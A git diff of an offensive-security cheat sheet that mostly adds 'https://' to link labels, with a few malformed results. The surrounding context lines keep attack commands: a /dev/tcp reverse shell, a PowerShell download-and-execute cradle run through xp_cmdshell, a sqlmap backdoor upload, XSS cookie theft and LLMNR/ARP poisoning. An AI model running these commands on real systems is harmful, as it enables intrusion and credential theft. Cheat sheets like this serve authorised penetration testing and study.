-* [serverfault.com/a/361806/554483](https://serverfault.com/a/361806/554483)
+* [https://serverfault.com/a/361806/554483](https://serverfault.com/a/361806/554483)
 
 ```
 $ python rdp2tcp.py add socks5 127.0.0.1 1080
@@ -2666,9 +2666,9 @@ find / -type f -perm /6000 -ls 2>/dev/null
 
 ### Dirty COW
 
-* [dirtycow.ninja/](https://dirtycow.ninja/)
-* [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
-* [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+* [https://dirtycow.ninja/](https://dirtycow.ninja/)
+* [https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
+* [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
 
 
 
@@ -2686,10 +2686,10 @@ if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1'
 $ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
 ```
 
-* [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
-* [tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
-* [tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
-* [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)
+* [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
+* [https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
+* [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
+* [https://popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)
 
 
 
@@ -2703,12 +2703,12 @@ $ echo '<BASE64_SHELL>' >> 00-header
 * Fire up new SSH session and catch the reverse shell
 ```
 
-* [www.securityfocus.com/bid/50192/discuss](https://www.securityfocus.com/bid/50192/discuss)
+* [https://www.securityfocus.com/bid/50192/discuss](https://www.securityfocus.com/bid/50192/discuss)
 
 PAM MOTD:
 
-* [www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
-* [www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)
+* [https://www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
+* [https://www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)
 
 
 
@@ -2734,21 +2734,21 @@ PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Inte
 
 ### SDDL
 
-* [habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
+* [https://habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
 * [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
 * [0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html](https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html)
-* [security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/](https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/)
+* [https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/](https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/)
 
 
 
 ### Potatoes
 
-* [jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+* [https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
 
 
 #### foxglovesec/RottenPotato
 
-* [foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
+* [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
 
 ```
 meterpreter > upload [3]
@@ -2786,7 +2786,7 @@ cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127
 
 #### decoder/the-lonely-potato
 
-* [decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)
+* [https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)
 
 
 
@@ -2854,7 +2854,7 @@ PS > Invoke-Command -ScriptBlock { whoami } -Session $s
 
 ##### Invoke-RunAs
 
-* [github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1)
+* [https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1)
 
 ```
 PS > Invoke-RunAs -UserName snovvcrash -Password 'Passw0rd!' -Domain MEGACORP -Cmd cmd.exe -Arguments "/c ping -n 1 10.10.13.37"
@@ -2862,9 +2862,9 @@ PS > Invoke-RunAs -UserName snovvcrash -Password 'Passw0rd!' -Domain MEGACORP -C
 
 ##### Invoke-CommandAs
 
-* [github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1)
-* [github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1)
-* [malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)
+* [https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1)
+* [https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1)
+* [https://malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)
 
 ```
 PS > . .\Invoke-ScheduledTask.ps1
@@ -2874,7 +2874,7 @@ PS > Invoke-CommandAs -ScriptBlock {whoami} -AsUser $cred
 
 ##### RunasCs
 
-* [github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
+* [https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)
 
 ```
 $ rlwrap nc -lvnp 1337
@@ -2965,17 +2965,17 @@ $ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
 
 ## Oracle
 
-* [xakep.ru/2015/04/07/195-oracle-db/](https://xakep.ru/2015/04/07/195-oracle-db/)
-* [www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)
-* [book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener)
-* [www.red-database-security.com/wp/oracle_cheat.pdf](http://www.red-database-security.com/wp/oracle_cheat.pdf)
+* [https://xakep.ru/2015/04/07/195-oracle-db/](https://xakep.ru/2015/04/07/195-oracle-db/)
+* [https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)
+* [https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener)
+* [http://www.red-database-security.com/wp/oracle_cheat.pdf](http://www.red-database-security.com/wp/oracle_cheat.pdf)
 
 
 
 ### TNS Poison
 
-* [www.joxeankoret.com/download/tnspoison.pdf](http://www.joxeankoret.com/download/tnspoison.pdf)
-* [www.youtube.com/watch?v=0IKltOBXiII](https://www.youtube.com/watch?v=0IKltOBXiII)
+* [http://www.joxeankoret.com/download/tnspoison.pdf](http://www.joxeankoret.com/download/tnspoison.pdf)
+* [https://www.youtube.com/watch?v=0IKltOBXiII](https://www.youtube.com/watch?v=0IKltOBXiII)
 
 
 #### Nmap
@@ -2990,8 +2990,8 @@ $ sudo nmap -v -n -Pn -sV --script=oracle-tns-poison.nse -oA CVE-2014-0160/nmap/
 
 Install manually:
 
-* [github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)
-* [github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)
+* [https://github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)
+* [https://github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)
 
 ```
 $ git clone https://github.com/quentinhardy/odat ~/tools/odat && cd ~/tools/odat
@@ -3013,7 +3013,7 @@ $ python3 odat.py -h
 
 Usage:
 
-* [github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)
+* [https://github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)
 
 ```
 $ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --test-module
@@ -3067,7 +3067,7 @@ SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).Dow
 
 ### mssql-cli
 
-* [github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)
+* [https://github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)
 
 ```
 $ python -m pip install mssql-cli
@@ -3102,7 +3102,7 @@ SELECT username,password FROM secret_database;
 
 ## Redis
 
-* [packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
+* [https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
 * [2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
 
 
@@ -3145,7 +3145,7 @@ $ redis-cli -h 127.0.0.1 config set dir /var/www/html/
 $ redis-cli -h 127.0.0.1 save
 ```
 
-* [book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
+* [https://book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
 
 
 
@@ -3167,7 +3167,7 @@ $ redis-cli -h 127.0.0.1 save
 
 # 1C
 
-* [t.me/webpwn/280](https://t.me/webpwn/280)
+* [https://t.me/webpwn/280](https://t.me/webpwn/280)
 
 
 
@@ -3184,7 +3184,7 @@ $ redis-cli -h 127.0.0.1 save
 
 ### PHP RFI with SMB
 
-* [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+* [http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
 
 `/etc/samba/smb.conf`:
 
@@ -3216,8 +3216,8 @@ $ tail -f /var/log/samba/log.<HOSTNAME>
 
 #### PHP
 
-* [medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
-* [outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
+* [https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
+* [https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
 
 Access log (needs single `'` instead of double `"`):
 
@@ -3244,7 +3244,7 @@ $ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//
 
 ## SQLi
 
-* [swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
+* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
 
 
 
@@ -3261,7 +3261,7 @@ $ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetp
 
 Test WAF:
 
-* [www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)
+* [https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/](https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)
 
 ```
 $ sqlmap.py -u 'https://127.0.0.1/index.php' --data='{"id":"*"}' -p id --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 -b --batch -v6
@@ -3271,10 +3271,10 @@ $ sqlmap.py -u 'https://127.0.0.1/index.php' --data='{"id":"*"}' -p id --identif
 
 ### DIOS
 
-* [defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
-* [www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
-* [dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
-* [www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)
+* [https://defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
+* [http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
+* [https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
+* [https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)
 
 MySQL:
 
@@ -3297,7 +3297,7 @@ id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (myt
 
 ### Truncation Attack
 
-* [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
+* [https://www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
 
 ```
 POST /index.php HTTP/1.1
@@ -3339,7 +3339,7 @@ id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
 
 ### Redirections
 
-* [developer.mozilla.org/ru/docs/Web/HTTP/Redirections](https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections)
+* [https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections](https://developer.mozilla.org/ru/docs/Web/HTTP/Redirections)
 
 ```html
 <head> 
@@ -3354,7 +3354,7 @@ id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
 
 #### Cookies
 
-* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+* [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
 
 Img tag:
 
@@ -3381,7 +3381,7 @@ body: document.cookie
 
 #### XSS to LFI
 
-* [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
+* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
 
 ```javascript
 <script>
@@ -3401,7 +3401,7 @@ xhr.send();
 
 #### XSS to CSRF
 
-* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+* [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
 
 If the endpoint is accessible only from localhost:
 
@@ -3488,7 +3488,7 @@ GitHub:
 
 * [Femida XSS](https://github.com/wish-i-was/femida)
 * [SHELLING](https://github.com/ewilded/shelling)
-* [burp-vulners-scanner](https://github.com/vulnersCom/burp-vulners-scanner)
+* [https://burp-vulners-scanner](https://github.com/vulnersCom/burp-vulners-scanner)
 
 
 
@@ -3514,7 +3514,7 @@ $ nikto -h http://127.0.0.1 -Cgidirs all
 
 Download through Tor:
 
-* [ghidra-sre.org/](https://ghidra-sre.org/)
+* [https://ghidra-sre.org/](https://ghidra-sre.org/)
 
 Install:
 
@@ -3568,7 +3568,7 @@ $ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
 
 #### Wireshark
 
-* [research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+* [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
 ##### Filters
 
@@ -3591,10 +3591,10 @@ Arpspoof:
 
 #### Responder
 
-* [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
-* [github.com/lgandx/Responder](https://github.com/lgandx/Responder)
-* [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
-* [markclayton.github.io/where-are-my-hashes-responder-observations.html](https://markclayton.github.io/where-are-my-hashes-responder-observations.html)
+* [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
+* [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
+* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+* [https://markclayton.github.io/where-are-my-hashes-responder-observations.html](https://markclayton.github.io/where-are-my-hashes-responder-observations.html)
 
 ```
 $ git clone https://github.com/lgandx/Responder
@@ -3607,7 +3607,7 @@ $ sort -u -t: -k1,1 ~/workspace/loot/net-ntlmv2.responder >> ~/workspace/loot/ne
 
 #### Inveigh
 
-* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+* [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
 
 ```
 PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
@@ -3615,8 +3615,8 @@ PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y �
 
 ##### InveighZero
 
-* [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
-* [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
+* [https://github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
+* [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
 
 ```
 PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
@@ -3637,7 +3637,7 @@ $ sudo sysctl -w net.ipv4.ip_forward=1
 
 #### dsniff [arpspoof]
 
-* [github.com/tecknicaltom/dsniff](https://github.com/tecknicaltom/dsniff)
+* [https://github.com/tecknicaltom/dsniff](https://github.com/tecknicaltom/dsniff)
 
 Install:
 
@@ -3654,21 +3654,21 @@ $ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
 
 #### bettercap
 
-* [github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
-* [www.bettercap.org/modules/](https://www.bettercap.org/modules/)
-* [linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/](https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/)
-* [hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy)
-* [www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets](https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets)
+* [https://github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
+* [https://www.bettercap.org/modules/](https://www.bettercap.org/modules/)
+* [https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/](https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/)
+* [https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy)
+* [https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets](https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets)
 
 Deb dependencies (Ubuntu 18.04 LTS):
 
-* [libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
-* [libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
-* [libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
-* [pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
-* [libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
-* [libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
-* [libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)
+* [https://libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
+* [https://libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [https://libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
+* [https://pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
+* [https://libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
+* [https://libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
+* [https://libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)
 
 
 
@@ -3677,9 +3677,9 @@ Deb dependencies (Ubuntu 18.04 LTS):
 
 #### mitm6
 
-* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
-* [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
-* [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
+* [https://github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
+* [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+* [https://intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
 
 Install:
 
@@ -3728,9 +3728,9 @@ Relay authentication with ntlmrelayx.py (active):
 
 ### ARP
 
-* [edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html](http://edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html)
-* [null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/](https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/)
-* [www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)
+* [http://edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html](http://edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html)
+* [https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/](https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/)
+* [https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)
 
 
 #### arp-scan
@@ -3761,7 +3761,7 @@ $ netdiscover -i eth0 -r 192.168.0.1/24 -c 20
 
 ### Hunting for Subnets
 
-* [hub.packtpub.com/optimize-scans/](https://hub.packtpub.com/optimize-scans/)
+* [https://hub.packtpub.com/optimize-scans/](https://hub.packtpub.com/optimize-scans/)
 
 Take `10.0.0.0/8` as an example:
 
@@ -3824,8 +3824,8 @@ $ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -
 
 `Invoke-Portscan.ps1`:
 
-* [github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
-* [powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
+* [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
+* [https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
 
 ```
 PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
@@ -3848,7 +3848,7 @@ $ bundle install && ln -s ~/tools/parsenmap-rb/parsenmap.rb /usr/local/bin/parse
 $ parsenmap.rb --help
 ```
 
-* [github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)
+* [https://github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)
 
 `nmaptocsv`:
 
@@ -3858,7 +3858,7 @@ $ python3 -m pip install -r requirements.txt csvkit && ln -s ~/tools/nmaptocsv/n
 $ nmaptocsv.py --help
 ```
 
-* [github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)
+* [https://github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)
 
 `parsenmap.py`:
 
